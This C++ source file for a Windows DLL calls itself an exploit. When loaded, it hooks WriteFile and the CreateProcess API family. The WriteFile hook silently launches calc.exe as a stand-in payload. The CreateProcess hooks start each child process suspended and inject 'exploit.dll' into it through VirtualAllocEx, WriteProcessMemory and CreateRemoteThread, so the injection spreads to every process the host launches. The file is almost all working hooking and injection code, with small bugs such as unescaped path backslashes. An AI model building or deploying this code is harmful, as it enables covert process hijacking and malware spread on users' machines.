// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

	if (firstLoad) {
		hack();
		firstLoad = false;
	}

    return TRUE;
}

void hack() {

	if (HookFunction == NULL || UnhookFunction == NULL || GetOriginalFunction == NULL) {

		/*
		std::wifstream ifs("exploit.txt");
		std::wstring functionName;
		std::getline(ifs, functionName);
		ifs.close();
		*/

		HMODULE hHookEngineDll = LoadLibrary(L"NtHookEngine.dll");
		if (hHookEngineDll == NULL) {
			message(L"could not load NtHookEngine");
			return;
		}

		HookFunction = (BOOL(__cdecl *)(ULONG_PTR, ULONG_PTR)) GetProcAddress(hHookEngineDll, "HookFunction");
		UnhookFunction = (VOID(__cdecl *)(ULONG_PTR)) GetProcAddress(hHookEngineDll, "UnhookFunction");
		GetOriginalFunction = (ULONG_PTR(__cdecl *)(ULONG_PTR)) GetProcAddress(hHookEngineDll, "GetOriginalFunction");
		GetBridgeByFunction = (ULONG_PTR(__cdecl *)(ULONG_PTR)) GetProcAddress(hHookEngineDll, "GetBridgeByFunction");

		if (HookFunction == NULL || UnhookFunction == NULL || GetOriginalFunction == NULL || GetBridgeByFunction == NULL) {
			message(L"I didnt get the functions =(");
			return;
		}
		/*
		ULONG_PTR targetFunctionAddress;
		targetFunctionAddress = (ULONG_PTR)GetProcAddress(LoadLibrary(L"Kernel32.dll"), utf16ToUTF8(functionName).c_str());
		if (targetFunctionAddress == NULL) {
			targetFunctionAddress = (ULONG_PTR)GetProcAddress(LoadLibrary(L"User32.dll"), utf16ToUTF8(functionName).c_str());
		}
		*/
		mutex = CreateMutex(NULL, FALSE, NULL);
		if (mutex == NULL) {
			message(L"Could not create mutex");
			return;
		}


		if (HookFunction(
			(ULONG_PTR) GetProcAddress(LoadLibrary(L"Kernel32.dll"), utf16ToUTF8(L"WriteFile").c_str()),
			(ULONG_PTR) &fake_WriteFile
		)) {
			message(L"Exploit hook success");
		} else {
			message(L"Exploit hook fail");
		}

		HookFunction(
			(ULONG_PTR)GetProcAddress(LoadLibrary(L"Kernel32.dll"), utf16ToUTF8(L"CreateProcessW").c_str()),
			(ULONG_PTR)&fake_CreateProcessW
		);

		HookFunction(
			(ULONG_PTR)GetProcAddress(LoadLibrary(L"Kernel32.dll"), utf16ToUTF8(L"CreateProcessA").c_str()),
			(ULONG_PTR)&fake_CreateProcessA
		);
		HookFunction(
			(ULONG_PTR)GetProcAddress(LoadLibrary(L"Kernel32.dll"), utf16ToUTF8(L"CreateProcessAsUserW").c_str()),
			(ULONG_PTR)&fake_CreateProcessAsUserW
		);
		HookFunction(
			(ULONG_PTR)GetProcAddress(LoadLibrary(L"Kernel32.dll"), utf16ToUTF8(L"CreateProcessAsUserA").c_str()),
			(ULONG_PTR)&fake_CreateProcessAsUserA
		);
	}

}


void message(const wchar_t* str) {
	//std::wcout << str << std::endl;
	MessageBox(NULL, str, L"dll message", MB_OK);
}

// wide string to string;
static std::string utf16ToUTF8(const std::wstring &s) {
	const int size = ::WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, NULL, 0, 0, NULL);

	std::vector<char> buf(size);
	::WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, &buf[0], size, 0, NULL);

	return std::string(&buf[0]);
}

BOOL WINAPI fake_WriteFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
	BOOL(WINAPI *real_WriteFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

	real_WriteFile = (BOOL(WINAPI*)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)) GetOriginalFunction((ULONG_PTR)fake_WriteFile);


	WaitForSingleObject(mutex, INFINITE);

	if (shouldRun) {
		exploit();
		shouldRun = false;
	}

	ReleaseMutex(mutex);

	return real_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

LRESULT fake_SendMessage(
	HWND   hWnd,
	UINT   Msg,
	WPARAM wParam,
	LPARAM lParam
) {

	LRESULT(*real_SendMessage)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

	real_SendMessage = (LRESULT(*)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)) GetOriginalFunction((ULONG_PTR)fake_SendMessage);

	WaitForSingleObject(mutex, INFINITE);

	if (shouldRun) {
		exploit();
		shouldRun = false;
	}

	ReleaseMutex(mutex);

	return real_SendMessage(hWnd, Msg, wParam, lParam);

}

void exploit() {
	message(L"THIS IS EXPLOIT");
	WinExec("C:\Windows\System32\calc.exe", SW_HIDE);
}


BOOL WINAPI fake_CreateProcessW(
	_In_opt_ LPCWSTR lpApplicationName,
	_Inout_opt_ LPWSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles,
	_In_ DWORD dwCreationFlags,
	_In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCWSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOW lpStartupInfo,
	_Out_ LPPROCESS_INFORMATION lpProcessInformation
) {
	BOOL(WINAPI *realCreateProcessW)(
		_In_opt_ LPCWSTR,
		_Inout_opt_ LPWSTR,
		_In_opt_ LPSECURITY_ATTRIBUTES,
		_In_opt_ LPSECURITY_ATTRIBUTES,
		_In_ BOOL,
		_In_ DWORD,
		_In_opt_ LPVOID,
		_In_opt_ LPCWSTR,
		_In_ LPSTARTUPINFOW,
		_Out_ LPPROCESS_INFORMATION
		);

	realCreateProcessW = (BOOL(WINAPI*)(
		_In_opt_ LPCWSTR,
		_Inout_opt_ LPWSTR,
		_In_opt_ LPSECURITY_ATTRIBUTES,
		_In_opt_ LPSECURITY_ATTRIBUTES,
		_In_ BOOL,
		_In_ DWORD,
		_In_opt_ LPVOID,
		_In_opt_ LPCWSTR,
		_In_ LPSTARTUPINFOW,
		_Out_ LPPROCESS_INFORMATION
		)) GetOriginalFunction((ULONG_PTR)fake_CreateProcessW);

	PROCESS_INFORMATION processInformation;



	const BOOL result = realCreateProcessW(
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		CREATE_SUSPENDED | dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		&processInformation
	);

	if (!result) {
		//message(L"unsuccessful createProcessW");
	} else {
		//message(L"successful createProcessW");
	}

	HANDLE hProcess = processInformation.hProcess;

	BOOL injectSuccessful = loadRemoteDLL(hProcess, "exploit.dll");

	if (dwCreationFlags == CREATE_SUSPENDED) {

	} else {

	}

	*lpProcessInformation = processInformation;
	ResumeThread(processInformation.hThread);
	return result;

}

BOOL WINAPI fake_CreateProcessA(
	_In_opt_ LPCSTR lpApplicationName,
	_Inout_opt_ LPSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles,
	_In_ DWORD dwCreationFlags,
	_In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOA lpStartupInfo,
	_Out_ LPPROCESS_INFORMATION lpProcessInformation
) {
	BOOL(WINAPI *realCreateProcessA)(
		_In_opt_ LPCSTR,
		_Inout_opt_ LPSTR,
		_In_opt_ LPSECURITY_ATTRIBUTES,
		_In_opt_ LPSECURITY_ATTRIBUTES,
		_In_ BOOL,
		_In_ DWORD,
		_In_opt_ LPVOID,
		_In_opt_ LPCSTR,
		_In_ LPSTARTUPINFOA,
		_Out_ LPPROCESS_INFORMATION
		);

	realCreateProcessA = (BOOL(WINAPI*)(
		_In_opt_ LPCSTR,
		_Inout_opt_ LPSTR,
		_In_opt_ LPSECURITY_ATTRIBUTES,
		_In_opt_ LPSECURITY_ATTRIBUTES,
		_In_ BOOL,
		_In_ DWORD,
		_In_opt_ LPVOID,
		_In_opt_ LPCSTR,
		_In_ LPSTARTUPINFOA,
		_Out_ LPPROCESS_INFORMATION
		)) GetOriginalFunction((ULONG_PTR)fake_CreateProcessA);


	PROCESS_INFORMATION processInformation;

	//message(L"before CreateProcessA");

	const BOOL result = realCreateProcessA(
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		CREATE_SUSPENDED | dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		&processInformation
	);

	if (!result) {
		//message(L"unsuccessful createProcessA");
	} else {
		//message(L"successful createProcessA");
	}

	HANDLE hProcess = processInformation.hProcess;

	BOOL injectSuccessful = loadRemoteDLL(hProcess, "exploit.dll");

	if (dwCreationFlags == CREATE_SUSPENDED) {

	} else {

	}

	*lpProcessInformation = processInformation;
	ResumeThread(processInformation.hThread);
	return result;

}

BOOL WINAPI fake_CreateProcessAsUserW(
	_In_opt_ HANDLE hToken,
	_In_opt_ LPCWSTR lpApplicationName,
	_Inout_opt_ LPWSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles,
	_In_ DWORD dwCreationFlags,
	_In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCWSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOW lpStartupInfo,
	_Out_ LPPROCESS_INFORMATION lpProcessInformation
) {
	BOOL(WINAPI *realCreateProcessAsUserW)(
		_In_opt_ HANDLE hToken,
		_In_opt_ LPCWSTR lpApplicationName,
		_Inout_opt_ LPWSTR lpCommandLine,
		_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_ BOOL bInheritHandles,
		_In_ DWORD dwCreationFlags,
		_In_opt_ LPVOID lpEnvironment,
		_In_opt_ LPCWSTR lpCurrentDirectory,
		_In_ LPSTARTUPINFOW lpStartupInfo,
		_Out_ LPPROCESS_INFORMATION lpProcessInformation
		);

	realCreateProcessAsUserW = (BOOL(WINAPI*)(
		_In_opt_ HANDLE hToken,
		_In_opt_ LPCWSTR lpApplicationName,
		_Inout_opt_ LPWSTR lpCommandLine,
		_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_ BOOL bInheritHandles,
		_In_ DWORD dwCreationFlags,
		_In_opt_ LPVOID lpEnvironment,
		_In_opt_ LPCWSTR lpCurrentDirectory,
		_In_ LPSTARTUPINFOW lpStartupInfo,
		_Out_ LPPROCESS_INFORMATION lpProcessInformation
		)) GetOriginalFunction((ULONG_PTR)fake_CreateProcessAsUserW);


	PROCESS_INFORMATION processInformation;

	//message(L"before CreateProcessAsUserW");

	const BOOL result = realCreateProcessAsUserW(
		hToken,
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		CREATE_SUSPENDED | dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		&processInformation
	);

	if (!result) {
		//message(L"unsuccessful createProcessAsUserW");
	} else {
		//message(L"successful createProcessAsUserW");
	}

	HANDLE hProcess = processInformation.hProcess;

	BOOL injectSuccessful = loadRemoteDLL(hProcess, "exploit.dll");

	if (dwCreationFlags == CREATE_SUSPENDED) {

	} else {

	}

	*lpProcessInformation = processInformation;
	ResumeThread(processInformation.hThread);
	return result;

}


BOOL WINAPI fake_CreateProcessAsUserA(
	_In_opt_ HANDLE hToken,
	_In_opt_ LPCSTR lpApplicationName,
	_Inout_opt_ LPSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ BOOL bInheritHandles,
	_In_ DWORD dwCreationFlags,
	_In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCSTR lpCurrentDirectory,
	_In_ LPSTARTUPINFOA lpStartupInfo,
	_Out_ LPPROCESS_INFORMATION lpProcessInformation
) {
	BOOL(WINAPI *realCreateProcessAsUserA)(
		_In_opt_ HANDLE hToken,
		_In_opt_ LPCSTR lpApplicationName,
		_Inout_opt_ LPSTR lpCommandLine,
		_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_ BOOL bInheritHandles,
		_In_ DWORD dwCreationFlags,
		_In_opt_ LPVOID lpEnvironment,
		_In_opt_ LPCSTR lpCurrentDirectory,
		_In_ LPSTARTUPINFOA lpStartupInfo,
		_Out_ LPPROCESS_INFORMATION lpProcessInformation
		);

	realCreateProcessAsUserA = (BOOL(WINAPI*)(
		_In_opt_ HANDLE hToken,
		_In_opt_ LPCSTR lpApplicationName,
		_Inout_opt_ LPSTR lpCommandLine,
		_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_ BOOL bInheritHandles,
		_In_ DWORD dwCreationFlags,
		_In_opt_ LPVOID lpEnvironment,
		_In_opt_ LPCSTR lpCurrentDirectory,
		_In_ LPSTARTUPINFOA lpStartupInfo,
		_Out_ LPPROCESS_INFORMATION lpProcessInformation
		)) GetOriginalFunction((ULONG_PTR)fake_CreateProcessAsUserA);


	PROCESS_INFORMATION processInformation;

	//message(L"before CreateProcessAsUserA");

	const BOOL result = realCreateProcessAsUserA(
		hToken,
		lpApplicationName,
		lpCommandLine,
		lpProcessAttributes,
		lpThreadAttributes,
		bInheritHandles,
		CREATE_SUSPENDED | dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		&processInformation
	);

	if (!result) {
		//message(L"unsuccessful createProcessAsUserA");
	} else {
		//message(L"successful createProcessAsUserA");
	}

	HANDLE hProcess = processInformation.hProcess;

	BOOL injectSuccessful = loadRemoteDLL(hProcess, "exploit.dll");

	if (dwCreationFlags == CREATE_SUSPENDED) {

	} else {

	}

	*lpProcessInformation = processInformation;
	ResumeThread(processInformation.hThread);
	return result;

}

BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath) {

	LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (dllPathAddressInRemoteMemory == NULL) {
		return FALSE;
	}

	BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);

	if (!succeededWriting) {
		return FALSE;
	} else {

		LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
		if (loadLibraryAddress == NULL) {
			return FALSE;
		} else {
			HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, NULL, NULL);
			if (remoteThread == NULL) {
				return FALSE;
			}
		}
	}

	//CloseHandle(hProcess);
	return TRUE;
}